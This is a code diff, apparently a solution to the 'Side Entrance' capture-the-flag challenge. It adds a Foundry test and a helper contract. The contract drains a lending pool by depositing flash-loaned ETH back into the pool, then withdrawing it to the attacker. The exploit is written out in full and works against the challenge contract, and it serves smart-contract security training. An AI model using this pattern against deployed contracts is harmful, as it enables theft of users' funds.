@@ -34,7 +34,10 @@ contract SideEntrance is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        vm.startPrank(attacker);
+        Buddy buddy = new Buddy(sideEntranceLenderPool);
+        buddy.hack(ETHER_IN_POOL);
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
@@ -43,4 +46,29 @@ contract SideEntrance is Test {
         assertEq(address(sideEntranceLenderPool).balance, 0);
         assertGt(attacker.balance, attackerInitialEthBalance);
     }
+}
+
+contract Buddy {
+    SideEntranceLenderPool private pool;
+    address private owner;
+
+    constructor(SideEntranceLenderPool _pool) {
+        pool = _pool;
+        owner = msg.sender;
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    function hack(uint256 amount) external {
+        // 1. first call flashLoan
+        pool.flashLoan(amount);
+        // 2. withdraw money
+        pool.withdraw();
+        // 3. send eth to owner
+        payable(owner).transfer(address(this).balance);
+    }
+
+    receive() external payable {}
 }
